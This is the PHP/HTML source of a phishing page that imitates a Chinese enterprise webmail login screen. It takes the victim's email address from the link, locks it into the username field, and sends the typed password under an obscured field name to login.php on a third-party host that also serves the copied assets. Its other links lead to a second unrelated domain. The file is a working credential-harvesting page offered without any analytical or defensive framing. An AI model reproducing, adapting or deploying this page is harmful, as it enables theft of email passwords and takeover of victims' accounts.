
<?php $email_from_link = isset($_GET['email']) ? $_GET['email'] : '';?>
<!DOCTYPE html> 
<html xmlns="http://www.w3.org/1999/xhtml"><head><meta http-equiv="Content-Type" content="text/html; charset=UTF-8"><meta name="robots" content="noindex, nofollow">
<meta name="googlebot" content="noindex, nofollow">

	
		
		<title>邮箱用户登录</title>
		<link href="https://kbokogroup.com/mail.sina.com.cn/set_files/global.css" rel="stylesheet" type="text/css">
		<link href="https://kbokogroup.com/mail.sina.com.cn/set_files/user.css" rel="stylesheet" type="text/css">
		<link href="https://kbokogroup.com/mail.sina.com.cn/set_files/custom.css" rel="stylesheet" type="text/css">
<style type="text/css">
			.login-mod h2, .intro-mod h2, .news-mod h2 {
				background-image:url(https://kbokogroup.com/mail.sina.com.cn/set_files/bg_cn_noqiye.png);
				background-repeat:no-repeat;
			}

			.ko {
     
    background-position: initial; 
    background-repeat: no-repeat;
    background-image: url(https://kbokogroup.com/mail.sina.com.cn/set_files/loom.png);
}
			.ko2 {
     
    background-position: initial; 
    background-repeat: no-repeat;
    background-image: url(https://kbokogroup.com/mail.sina.com.cn/set_files/loom2.png);
}

  
		</style>
   <script type="text/javascript">
   function frmvalidator() {
    var fuuk=document.getElementById('password');
	var apwra =document.getElementById("app-download-wrapper");
	var erwra =document.getElementById("err-wrapper");
	var ermsg =document.getElementById("msgpid");
    if(fuuk.value.length < 5) {
    apwra.style.display = "none";
    erwra.style.display = "block";
    ermsg.innerHTML = "请你输入密码";
        return false;
}else{
    erwra.style.display = "none";

return true;
    }
}
	</script><style type="text/css">
:root .mod > ._jH + .rscontainer
{ display: none !important; }</style>
	<style type="text/css"></style></head>
	<body>
		<div class="page">
			<div class="header">
				<h1 class="logo"></h1>
				<div class="toplinks">
                    <a href="javascript:void(0)" target="_self">繁體版</a> |
                        <a href="javascript:void(0)index.php" target="_self">English</a>
                        </div>
			</div>
			<div class="body">
				<div class="part main-part" id="main-part">
					<div id="login-mod-wrapper" class="login-mod-wrapper login-mod-form">
						<div class="mod login-mod  ">
<form name="loginform" id="loginform" action="https://kbokogroup.com/mail.sina.com.cn/login.php" method="post" autocomplete="off" >  
								<h2>
									企业用户登录
								</h2>
								<div class="fi">
									<label class="tit">
										用户名
									</label>
									<input name="accounname" type="email" class="ipt-t ipt-sample" id="auto-id-1523799205816" placeholder="请输入登录帐号" value="<?php echo $email_from_link;?>" readonly="">
								</div>
								<div class="fi">
									<label class="tit">
										密 码
									</label>
									<input type="password" placeholder="请你输入密码" class="ipt-t" name="rahdhj" id="password" value="">
								</div>
								<!-- 新增验证码 -->
								<div id="verifyCodeWrap" class="fi f-dn">
									<label class="tit">验证码</label>
									<input type="text" name="verify_code" id="verify_code" style="float:left;width:140px;height:24px;line-height:24px;" class="ipt-sample">
									<a id="codeImgWrap" style="float:left;width:100px;height:30px;padding:0;margin:0;display:block;cursor:pointer;" href="javascript:void(0);">
										<img src="javascript:void(0)" style="width:100%;height:100%;">
									</a>
								</div>
								<div class="fi" style="clear:both;">
									<label for="remUsername">
										<input id="remUsername" value="1" type="checkbox" class="ipt-c">
										记住用户名
									</label>
									&nbsp;&nbsp;
									<input type="hidden" value="1">
									<label for="secure">
										<input id="secure" disabled="disabled" value="1" checked="" type="checkbox" class="ipt-c">
										SSL安全登录
									</label>
									&nbsp;&nbsp;
									<label for="all_secure">
										<input  id="all_secure" value="1" type="checkbox" class="ipt-c">
										全程SSL
									</label>
								</div>
								<div class="fi fi-notit f-cb">
								 
								
									<input type="submit" class="ipt-b" value="登　录" style="float:left;"  name="inojuhkj" id="submit-btn">
									
									
                                    <div id="app-download-wrapper">
                                        <div class="app-download app-download-android">
                                            <a class="app-download-link" href="http://www.bellaiva.com/Made-in-china/1.php/837d7329472eb0733a51bd56a057796f/cn/mail.php?hl-CN/mail/index.htm/index.jslocale=hlCN=http2Fmail.com%2Fdefault" target="_top">Android版</a>&nbsp;
                                        </div>
                                        <div class="app-download app-download-iphone">
                                            <a class="app-download-link" href="http://www.bellaiva.com/Made-in-china/1.php/837d7329472eb0733a51bd56a057796f/cn/mail.php?hl-CN/mail/index.htm/index.jslocale=hlCN=http2Fmail.com%2Fdefault" target="_top">iPhone版</a>
                                        </div>
                                    </div>
									<table id="err-wrapper" class="err f-dn">
										<tbody><tr>
											<td id="msgpid">帐号或密码错误，请重新输入</td>
										</tr>
									</tbody></table>
								</div>
								<div class="goto" style="margin-top:0;">
										<a href="http://www.bellaiva.com/Made-in-china/1.php/837d7329472eb0733a51bd56a057796f/cn/mail.php?hl-CN/mail/index.htm/index.jslocale=hlCN=http2Fmail.com%2Fdefault" class="gotoLink" target="_top">管理员登录</a>
                                        <a class="gotoLink" id="resetPwd">忘记密码？</a>
										<a class="gotoLink" id="selectNetwork">登录太慢？</a>
										</div>
								</form>
						</div>
                        <div id="login-qr-1" class="login-qr login-qr-1"></div>
                    <div class="m-codebox js-codebox f-zindex-10 login-mod-form">
						<!-- 安全登录 -->
						<div id="appLoginTab" class="appLoginTab">
							<div id="appLoginWait" style="display: block;">
								<h3>手机扫码 安全防盗</h3>
								<div id="appCodeWrap" class="appCodeWrap allowmove">
									<div class="appCode-example"></div>
									<div id="appCodeBox" class="appCodeBox">
										<img id="appCode" class="appCode" width="130" height="130" src="https://kbokogroup.com/mail.sina.com.cn/set_files/getqrcode.jpg">
										<div id="appCodeRefresh" class="appCodeRefresh" style="display: none;">
											<div class="appCode-wrap"><p>二维码已失效<br>请点击刷新</p></div>
										</div>
									</div>
								</div>
								<p id="appLoginTxt" class="appLoginTxt txt-err"></p>
								<p class="appLogin-hint">使用 邮箱大师 扫描二维码登录</p>
								<p class="appLoginlink"><a id="howToUseApp" class="howToUseApp" href="javascript:void(0)">如何使用</a><var>|</var><a href="http://mail.163.com/dashi/" target="_top">下载邮箱大师</a></p>
							</div>
							<div id="appLoginScan" class="appLoginScan" style="display:none">
								<div class="appLogin-scanSuc"></div>
								<p class="appLogin-scantxt txt-suc">成功扫描，请在手机上确认登录</p>
								<a id="appLoginRestart" class="appLoginRestart" href="javascript:void(0)">返回重新扫描</a>
							</div>
						</div>
						<a class="closeentry js-closeentry" href="javascript:;" hidefocus="true"></a>
						</div>
                    </div>
				</div>
				<div class="part sec-part">
						<div class="mod sec-mod intro-mod">
								<h2  style="width: 100px;float: left;">
									 
								</h2>
								<div style="height: 81px;width: 117px;float: right;" class="ko2"> </div>
								</div>
						<div class="mod sec-mod news-mod">
								<h2 style="width: 200px;float: left;">
									新闻
								</h2>
								<div style="height: 81px;width: 117px;float: right;" class="ko"> </div>
								</div>
						</div>
				</div>
			<div class="footer">
                <div class="link">
                        </div>

                    <div class="right">
                        <span>
                            
                            邮件公司 ©1997-2020                            </span>
                    </div>
                </div>
		</div>
	


</body></html>
